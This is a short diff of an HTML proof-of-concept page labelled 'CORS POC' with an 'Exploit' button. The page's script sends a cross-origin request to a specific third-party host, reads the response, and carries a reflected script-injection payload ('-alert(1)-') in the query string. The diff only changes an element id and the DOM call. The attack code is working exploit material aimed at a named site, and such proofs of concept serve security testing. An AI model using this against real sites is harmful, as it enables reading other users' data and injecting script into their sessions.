@@ -5,7 +5,7 @@
 <h2>CORS POC </h2>
 <h3>Extract </h3>
  
-<div id="script">
+<div id="mockDataEnabled">
 <button type="button" onclick="cors()">Exploit</button>
 </div>
  
@@ -14,7 +14,7 @@ function cors() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
-      document.getElementsByTagName("script").innerHTML = alert(this.responseText);
+      document.getElementById("mockDataEnabled").innerHTML = alert(this.responseText);
     }
   };
   xhttp.open("GET", "https://be.wau-miau.ch/?yx36r'-alert(1)-'em1yb=1", true);
